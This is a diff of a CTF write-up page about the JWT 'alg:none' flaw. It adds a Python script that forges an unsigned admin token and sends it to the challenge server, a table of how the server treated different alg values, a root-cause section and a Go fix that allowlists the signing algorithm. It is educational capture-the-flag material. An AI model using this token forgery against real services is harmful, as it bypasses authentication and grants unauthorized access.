@@ -248,31 +248,72 @@ span.linenos.special { color: #e6edf3; background-color: #6e7681; padding-left: 
 .codehilite .vm { color: #79C0FF } /* Name.Variable.Magic */
 .codehilite .il { color: #A5D6FF } /* Literal.Number.Integer.Long */
 pre .codehilite, .codehilite pre{background:transparent;border:0;padding:0;margin:0}
-</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web">Web</a><a href="../index.html#crypto" class="on">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#crypto">Crypto</a></div><h1>None shall pass — JWT alg:none</h1><p class="tags"><span class="tag">jwt</span><span class="tag">alg-none</span><span class="tag">cve-2025-59685</span></p><div class="artmeta"><span>none-shall-pass.is-course.ru</span><span>1 min read</span><span>110 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#recon">Recon</a></li>
+</style></head><body class=""><header class="top"><div class="wrap"><a class="brand" href="../index.html"><span class="dot"></span>YDS CTF <small>writeups</small></a><nav class="top-nav"><a href="../index.html#web">Web</a><a href="../index.html#crypto" class="on">Crypto</a><a href="../index.html#reverse">Reverse</a><a href="../index.html#forensics">Forensics</a><a href="../index.html#android">Mobile</a><a href="../index.html#misc">Misc</a><a href="../index.html#tools">Tooling</a><a href="../index.html">All</a></nav></div></header><article><div class="crumbs"><a href="../index.html">writeups</a> <span>/</span> <a href="../index.html#crypto">Crypto</a></div><h1>None shall pass — JWT alg:none</h1><p class="tags"><span class="tag">jwt</span><span class="tag">alg-none</span><span class="tag">cve-2025-59685</span></p><div class="artmeta"><span>none-shall-pass.is-course.ru</span><span>1 min read</span><span>198 words</span></div><nav class="toc"><div class="t">On this page</div><ol><li><a href="#recon">Recon</a></li>
 <li><a href="#exploit">Exploit</a></li>
+<li><a href="#root-cause">Root cause</a></li>
 <li><a href="#fix">Fix</a></li></ol></nav><h1 id="none-shall-pass">None shall pass</h1>
 <h2 id="recon" id="recon">Recon</h2>
-<p>The app issues a JWT on signup and gates a "Restricted Page" on it. Decoding the token:</p>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"alg"</span><span class="p">:</span><span class="s2">"HS256"</span><span class="p">,</span><span class="nt">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">}</span><span class="err">.</span><span class="p">{</span><span class="nt">"user"</span><span class="p">:</span><span class="s2">"guest"</span><span class="p">,</span><span class="nt">"role"</span><span class="p">:</span><span class="s2">"user"</span><span class="p">}</span><span class="err">.&lt;sig&gt;</span>
+<p>Signup issues a JWT in the <strong><code>sess_id</code></strong> cookie; <code>/restricted</code> gates a page on it:</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"alg"</span><span class="p">:</span><span class="s2">"HS256"</span><span class="p">,</span><span class="nt">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">}</span><span class="err">.</span><span class="p">{</span><span class="nt">"admin"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"guest"</span><span class="p">}</span><span class="err">.&lt;sig&gt;</span>
 </code></pre></div>
 
-<p>The verifier reads the algorithm <strong>from the token header</strong> and dispatches on it.</p>
+<p>The verifier dispatches on <code>alg</code> <em>from the header</em> — the usual mistake.</p>
 <h2 id="exploit" id="exploit">Exploit</h2>
-<p>Set <code>"alg":"none"</code>, keep the payload, drop the signature entirely:</p>
-<div class="codehilite"><pre><span></span><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
+<p>Set <code>alg</code> to <code>none</code>, flip the claim, and drop the signature. Note the empty signature segment must still
+be present (two dots at the end):</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span><span class="o">,</span><span class="w"> </span><span class="nn">requests</span>
+
+<span class="n">b64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">b</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s2">"="</span><span class="p">)</span>
+<span class="n">tok</span> <span class="o">=</span> <span class="p">(</span><span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"alg"</span><span class="p">:</span><span class="s2">"none"</span><span class="p">,</span><span class="s2">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">},</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span><span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span> <span class="o">+</span>
+       <span class="n">b64</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"admin"</span><span class="p">:</span><span class="kc">True</span><span class="p">,</span><span class="s2">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="s2">"role"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">},</span>
+                      <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">","</span><span class="p">,</span><span class="s2">":"</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"."</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"https://none-shall-pass.is-course.ru/restricted"</span><span class="p">,</span>
+                 <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">"sess_id"</span><span class="p">:</span> <span class="n">tok</span><span class="o">.</span><span class="n">decode</span><span class="p">()})</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>          <span class="c1"># 200 YDS{…redacted…}</span>
 </code></pre></div>
 
-<p>The server accepts the unsigned token, <code>role=admin</code> unlocks the restricted page, and the flag is
-rendered there.</p>
-<p>This is the modern incarnation of the <code>alg:none</code> family (cf. CVE-2025-59685): the lesson is that the
-<em>verifier</em> must pin a single algorithm and must reject tokens whose <code>alg</code> is <code>none</code> or was not
-configured — the header is attacker-controlled data, not a trusted instruction.</p>
+<p>The <code>alg</code> value is matched <strong>case-sensitively</strong> in this deployment — measured:</p>
+<table>
+<thead>
+<tr>
+<th><code>alg</code></th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>none</code></td>
+<td><strong>200</strong> — flag returned</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>400 (generic error page)</td>
+</tr>
+<tr>
+<td><code>HS256</code> with empty signature</td>
+<td>400</td>
+</tr>
+</tbody>
+</table>
+<p>That last row matters: an empty-signature HS256 is rejected, so this is not "any unsigned token
+works" — it is specifically the <code>none</code> branch of the verifier.</p>
+<h2 id="root-cause" id="root-cause">Root cause</h2>
+<p><code>none</code> is a legitimate JOSE algorithm meaning "no signature". A verifier that reads the algorithm from
+the token (rather than pinning an allowlist) will happily accept a token that authenticates <em>itself</em>.
+The 2025 regression of this bug class (CVE-2025-59685 and friends) is a reminder that libraries
+re-enable it whenever the key-function returns a key before checking the method.</p>
 <h2 id="fix" id="fix">Fix</h2>
 <div class="codehilite"><pre><span></span><code><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">jwt</span><span class="p">.</span><span class="nx">ParseWithClaims</span><span class="p">(</span><span class="nx">raw</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">Claims</span><span class="p">{},</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">t</span><span class="w"> </span><span class="o">*</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">Token</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="kt">any</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">Method</span><span class="p">.</span><span class="nx">Alg</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">"HS256"</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">"unexpected alg"</span><span class="p">)</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">Method</span><span class="p">.</span><span class="nx">Alg</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">"HS256"</span><span class="w"> </span><span class="p">{</span><span class="w">                 </span><span class="c1">// allowlist, not a denylist</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">"unexpected signing method"</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">secret</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
 <span class="p">})</span>
-</code></pre></div><nav class="pager"><a href="extender.html"><div class="lbl">&larr; previous</div><div class="ttl">Hash extender — SHA-256 length extension</div></a><a class="next" href="rsa-common.html"><div class="lbl">next &rarr;</div><div class="ttl">RSA: a lot in common</div></a></nav></article><footer>YDS CTF writeups &middot; built from Markdown &middot; flags omitted by design</footer>
+</code></pre></div>
+
+<p>Better: pass <code>jwt.WithValidMethods([]string{"HS256"})</code>, and reject any token whose signature is empty
+before it reaches the parser.</p><nav class="pager"><a href="extender.html"><div class="lbl">&larr; previous</div><div class="ttl">Hash extender — SHA-256 length extension</div></a><a class="next" href="rsa-common.html"><div class="lbl">next &rarr;</div><div class="ttl">RSA: a lot in common</div></a></nav></article><footer>YDS CTF writeups &middot; built from Markdown &middot; flags omitted by design</footer>
 <script>
 document.querySelectorAll('pre').forEach(function(pre){
   var b=document.createElement('button');
